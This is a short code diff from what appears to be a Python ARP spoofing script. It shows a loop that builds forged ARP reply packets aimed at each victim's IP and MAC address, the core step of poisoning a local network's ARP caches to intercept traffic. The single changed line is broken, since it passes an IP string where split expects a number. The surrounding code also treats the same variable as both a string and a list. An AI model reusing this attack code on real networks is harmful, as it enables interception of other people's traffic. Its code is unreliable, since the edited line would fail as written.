@@ -86,7 +86,7 @@ if __name__ == "__main__":
             # send arp relies spoofing
             print(" ")
             for j in range(0,len(ip)):
-                print(ip.split(".")[3])
+                print(ip.split(".",ip[j])[3])
                 victimpacket = ARP( op      =  2,
                                     pdst    = ip[j],            # victim's IP
                                     hwdst   = mac[j],           # victim's MAC 
